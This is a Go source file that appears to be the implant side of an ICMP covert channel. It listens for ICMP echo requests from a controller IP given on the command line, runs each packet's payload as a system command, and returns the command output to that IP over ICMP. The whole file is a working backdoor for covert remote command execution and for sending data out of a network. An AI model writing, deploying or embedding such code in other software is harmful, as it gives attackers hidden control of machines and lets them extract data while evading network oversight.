package main

import (
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"covert_chanel/icmp"
	"log"
	"os/exec"
	"bytes"

	"strings"
	"os"
)

var ip string

func handlePacket(packet gopacket.Packet) {


	command := string(packet.Layer(gopacket.LayerTypePayload).LayerContents())
	args := strings.Split(command," ")
	cmd := exec.Command(args[0],args[1:]...)
		var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		log.Println(err)
	}

	log.Printf("in all caps: %q\n", out.String())
	log.Println(ip)
	icmp.Handler(out.String(),ip)



}

func main() {
	log.Println("inicia")
	ip = os.Args[1]
	device := os.Args[2]
	if handle, err := pcap.OpenLive(device, 1600, true, pcap.BlockForever); err != nil {
		panic(err)
	} else if err := handle.SetBPFFilter("src host "+ip+" and icmp"); err != nil { // optional
		panic(err)
	} else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			boolean := strings.Contains(packet.Dump(),"TypeCode=EchoRequest")
			log.Println(boolean)
			if boolean{
				handlePacket(packet) // Do something with a packet here.
			}
		}
	}
}
